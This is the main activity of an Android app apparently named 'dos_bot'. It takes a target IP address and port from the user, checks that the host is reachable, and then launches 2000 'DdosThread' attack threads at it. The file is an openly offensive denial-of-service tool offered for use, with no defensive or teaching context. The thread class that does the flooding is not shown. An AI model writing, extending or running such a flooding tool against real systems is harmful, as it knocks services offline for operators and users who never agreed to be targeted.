package com.example.dos_bot;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.DialogInterface;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;


import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState)  {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button attackBtn = findViewById(R.id.button);
        EditText ipText = findViewById(R.id.ipText);
        EditText portText = findViewById(R.id.portText);
        ProgressBar progressBar = findViewById(R.id.progressBar);

        if(!isOnline())
            openNoInternetDialog();

        attackBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                progressBar.setVisibility(View.VISIBLE);

                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Socket socket = new Socket();
                            socket.connect(new InetSocketAddress(ipText.getText().toString(), Integer.parseInt(portText.getText().toString())), 5000);

                            for (int i = 0; i < 2000; i++) {
                                DdosThread thread = new DdosThread(ipText.getText().toString(), Integer.parseInt(portText.getText().toString()));
                                thread.start();
                            }
                        } catch (IOException e) {
                            progressBar.setVisibility(View.INVISIBLE);
                            openUnreachableDialog();
                            System.out.println("Error : " + e.getMessage());
                            e.printStackTrace();
                        }
                    }
                });
                thread.start();
            }
        });
    }

    public boolean isOnline() {
        ConnectivityManager conMgr = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = conMgr.getActiveNetworkInfo();

        if(netInfo == null || !netInfo.isConnected() || !netInfo.isAvailable()){
            Toast.makeText(getApplicationContext(), "No Internet connection!", Toast.LENGTH_LONG).show();
            return false;
        }
        return true;
    }

    public void openNoInternetDialog(){
        boolean  online = isOnline();

        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle("No internet Connection");
        builder.setMessage("Please turn on internet connection to continue");
        builder.setNegativeButton("close", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if(!online)
                    openNoInternetDialog();
                else
                    dialog.dismiss();
            }
        });
        android.app.AlertDialog alertDialog = builder.create();
        alertDialog.show();
    }

    public void openUnreachableDialog( ) {
        UnreachableDialog unreachableDialog = new UnreachableDialog();
        unreachableDialog.show(getSupportFragmentManager(), "tag");
    }
}